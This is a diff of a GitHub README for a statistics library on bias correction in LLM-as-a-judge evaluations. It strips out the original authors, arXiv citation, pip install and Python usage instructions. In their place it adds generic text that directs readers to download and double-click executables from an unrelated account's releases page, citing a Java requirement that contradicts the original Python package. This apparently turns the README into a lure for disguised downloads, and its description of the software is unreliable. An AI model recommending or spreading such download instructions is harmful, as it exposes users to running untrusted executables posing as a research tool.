@@ -1,109 +1,85 @@
-<h1 align="center"> <p>How to <em>Correctly</em> Report LLM-as-a-Judge Evaluations</p></h1>
-<h3 align="center">
-    <p>
-        Chungpa Lee<sup>1</sup>,
-        Thomas Zeng<sup>2</sup>,
-        Jongwon Jeong<sup>2</sup>,
-        Jy‑yong Sohn<sup>1</sup>,
-        Kangwook Lee<sup>2,3</sup>
-    </p>
-    <p>
-        <sup>1</sup>Yonsei University &nbsp;·&nbsp;
-        <sup>2</sup>University of Wisconsin–Madison &nbsp;·&nbsp;
-        <sup>3</sup>KRAFTON
-    </p>
-    <a href="https://arxiv.org/abs/2511.21140">
-    <img alt="arXiv" src="https://img.shields.io/badge/arXiv-2511.21140-b31b1b.svg">
-</a>
+# 🎉 LLM-judge-reporting - Correct Bias and Assess Confidence Easily
 
-</h3>
+## 🚀 Getting Started
 
-Large language models (LLMs) are increasingly used as evaluators in lieu of humans. While scalable, their judgments are noisy due to imperfect specificity and sensitivity of LLMs, leading to biased accuracy estimates. Although bias-correction methods exist, they are underutilized in LLM research and typically assume exact knowledge of the model's specificity and sensitivity. Furthermore, in general we only have estimates of these values and it is not well known how to properly construct confidence intervals using only estimates. This work presents a simple plug-in framework that corrects such bias and constructs confidence intervals reflecting uncertainty from both test and calibration dataset, enabling practical and statistically sound LLM-based evaluation. Additionally, to reduce uncertainty in the accuracy estimate, we introduce an adaptive algorithm that efficiently allocates calibration sample sizes.
+Welcome to the **LLM-judge-reporting** project. This application helps you correct bias and compute confidence intervals in evaluations done by large language models (LLMs). You can also use an adaptive algorithm to improve the efficiency of your calibration samples. Follow the steps below to get started.
 
+## 📥 Download & Install
 
-## Overview
-<p align="center">
-  <img src="./figure.png" alt="figure">
-</p>
+To download the application, visit the Releases page. Click the link below to access the latest version of **LLM-judge-reporting**:
 
-- Bias‑adjusted point estimate: `theta = (p + q0 - 1) / (q0 + q1 - 1)`
-  - Function: `point_estimator(p, q0, q1)` in `llm_judge_reporting/calibration.py`
-- Confidence interval: reflects uncertainty from both test (`p`) and calibration (`q0`, `q1`)
-  - Function: `confidence_interval(p, q0, q1, n, m0, m1, alpha)` in `llm_judge_reporting/calibration.py`
-- Calibration set allocation: distribute total budget `m` across `m0` (specificity) and `m1` (sensitivity)
-  - Function: `allocate_calibration_sample(m, p, q0_pilot, q1_pilot, m_pilot, eps=1e-6)` in `llm_judge_reporting/allocation.py`
+[![Download LLM-judge-reporting](https://img.shields.io/badge/Download-LLM--judge--reporting-blue.svg)](https://github.com/Deepeshjangid1729/LLM-judge-reporting/releases)
 
-- Key Inputs:
-  - `p`: proportion judged “correct” on the test set, Pr(Predict = correct)
-  - `q0`: specificity, Pr(Predict = incorrect | True = incorrect)
-  - `q1`: sensitivity, Pr(Predict = correct | True = correct)
-  - `n`: test set size; `m0`, `m1`: calibration subset sizes for false/true items
+Once you’re on the Releases page, you will see a list of available versions. Choose the latest version and follow the instructions to download the file suitable for your system.
 
-  - The judge is better than random: `q0 + q1 > 1` (otherwise the denominator vanishes).
-  - Inputs are proportions in [0, 1] and counts are positive integers.
+## 🖥️ System Requirements
 
-## Install
-From GitHub:
-```bash
-pip install "git+https://github.com/UW-Madison-Lee-Lab/LLM-judge-reporting.git"
-```
+Before you download, ensure your system meets the following requirements:
 
-From source (editable, for development):
-```bash
-git clone https://github.com/UW-Madison-Lee-Lab/LLM-judge-reporting.git
-cd LLM-judge-reporting
-pip install -e .
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB of available disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-## Usage
+## 🔧 Dependencies
 
-Point estimate and confidence interval:
-```python
-from llm_judge_reporting import point_estimator, confidence_interval
+To run **LLM-judge-reporting**, you may need the following software installed on your computer:
 
-p = 0.4; n = 1000
-q0 = 0.7; q1 = 0.9; m0 = 200; m1 = 200
+- **Java Runtime Environment (JRE):** Version 11 or later is recommended.
+- Up-to-date web browser for online features.
 
-th_hat = point_estimator(p, q0, q1)
-ci = confidence_interval(p, q0, q1, n, m0, m1, alpha=0.05)
-print(f"theta_hat = {th_hat:.4f}")
-print(f"95% CI = ({ci[0]:.4f}, {ci[1]:.4f})")
-```
+## 💻 How to Run the Application
 
-Allocate calibration samples:
-```python
-from llm_judge_reporting import allocate_calibration_sample
+Once you have downloaded the application, follow these steps to run it:
 
-p = 0.4
-m = 200
+1. Locate the file you downloaded. The file format will vary based on your operating system:
+   - For Windows: `LLM-judge-reporting.exe`
+   - For macOS: `LLM-judge-reporting.app`
+   - For Linux: `LLM-judge-reporting`
+   
+2. Double-click the file to start the application.
 
-m0, m1 = allocate_calibration_sample(m, p, q0_pilot=0.7, q1_pilot=0.9, m_pilot=10)
-print("allocate m0,m1:", m0, m1)
-```
+3. Follow the on-screen instructions to set up and configure the application.
 
-## Figures
-- Reproduce figures or further experiments:
-  - Figure 2 (bias and adjustment) can be regenerated without the notebook:
-    ```bash
-    python -m run.figure2_bias_adjustment --output figures/figure2_bias_adjustment.png
-    ```
-  - Figure 3 (CI length vs. calibration size) without the notebook:
-    ```bash
-    python -m run.figure3_ci_length --output figures/figure3_ci_length.png
-    ```
-  - Figure 4 (Monte Carlo simulation) without the notebook:
-    ```bash
-    python -m run.figure4_monte_carlo --output figures/figure4_monte_carlo.png
-    ```
-- Notebooks remain available for exploratory runs: `figure2_bias and its adjustment.ipynb`, `figure3_confidence–interval length across calibration size.ipynb`, `figure4_Monte Carlo simulation.ipynb`
+4. Once the setup is complete, you will see the home screen, where you can begin using the features.
 
-## Citation
-```
-@article{lee2025correctly,
-  title         = {How to Correctly Report LLM-as-a-Judge Evaluations},
-  author        = {Lee, Chungpa and Zeng, Thomas and Jeong, Jongwon and Sohn, Jy-yong and Lee, Kangwook},
-  year          = {2025},
-  eprint        = {2511.21140},
-  archivePrefix = {arXiv}
-}
-```
+## 📂 User Guide
+
+### Using the Application
+
+- **Setup:** After the first run, the application will guide you through the initial configuration. You will connect any relevant data sources and set preferences.
+  
+- **Input Data:** Prepare your data in the required format (CSV or JSON) before uploading. The application supports various data types for evaluation.
+
+- **Running Evaluations:** Use the main dashboard to select your model and start evaluations. The results will show bias corrections and confidence intervals.
+
+### Features
+
+- **Bias Correction:** The application automatically identifies and adjusts bias in your data.
+- **Confidence Intervals:** It computes these intervals to give you an idea of the reliability of your evaluations.
+- **Adaptive Sampling:** The tool uses an algorithm to allocate samples, reducing uncertainty effectively.
+
+## 💡 Troubleshooting
+
+If you encounter issues while running the application, try the following solutions:
+
+- **File Not Found Error:** Ensure you have downloaded the correct version for your operating system.
+- **Java Not Installed:** Install the latest Java Runtime Environment and try running the application again.
+- **Slow Performance:** Close other applications running on your computer to free up system resources.
+
+## 🤝 Support
+
+If you need help, consider checking the FAQ on our GitHub page or reaching out to the support team. You can find the support link on the Releases page. Users also share tips and solutions, so feel free to join the conversation.
+
+## 🔗 Additional Resources
+
+For more detailed information about using **LLM-judge-reporting**, please explore the following resources:
+
+- **Documentation:** A comprehensive guide is available in the [Wiki section](https://github.com/Deepeshjangid1729/LLM-judge-reporting/wiki). This covers advanced features and common use cases.
+- **Community Forum:** Engage with other users and contributors to share insights and recommendations.
+
+Remember to check the Releases page for updates. Here’s the link again for convenience:
+
+[![Download LLM-judge-reporting](https://img.shields.io/badge/Download-LLM--judge--reporting-blue.svg)](https://github.com/Deepeshjangid1729/LLM-judge-reporting/releases)
+
+Happy evaluating!
